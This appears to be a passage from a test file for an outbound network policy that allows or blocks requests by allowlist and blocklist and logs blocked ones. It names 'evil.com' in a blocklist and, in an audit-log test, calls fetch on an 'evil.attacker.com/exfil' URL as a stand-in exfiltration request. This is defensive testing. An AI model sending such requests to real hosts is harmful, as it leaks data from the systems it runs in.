...
describe('OutboundNetworkPolicy', () => {
  ...
  beforeEach(() => {
    ...
    policy = new OutboundNetworkPolicy({
      enabled: true,
      allowlist: ['api.openai.com', 'api.anthropic.com', 'localhost', '127.0.0.1'],
      blocklist: ['evil.com'],
    });
  });
  ...
  describe('check', () => {
    it('allows URLs in the allowlist', () => {
      ...
      expect(policy.check('http://localhost:3000/api').allowed).toBe(true);
    });
    ...
    it('allows private IPs when explicitly in allowlist', () => {
      const p = new OutboundNetworkPolicy({
        enabled: true,
      ...
      expect(p.check('http://127.0.0.1:3000/api').allowed).toBe(true);
    });
  ...
  describe('audit logs', () => {
    it('records blocked requests in audit log', () => {
      policy.install();
      try {
        // Trigger a blocked request
        fetch('https://evil.attacker.com/exfil').catch(() => {});
      } catch {
        // ignore
      }
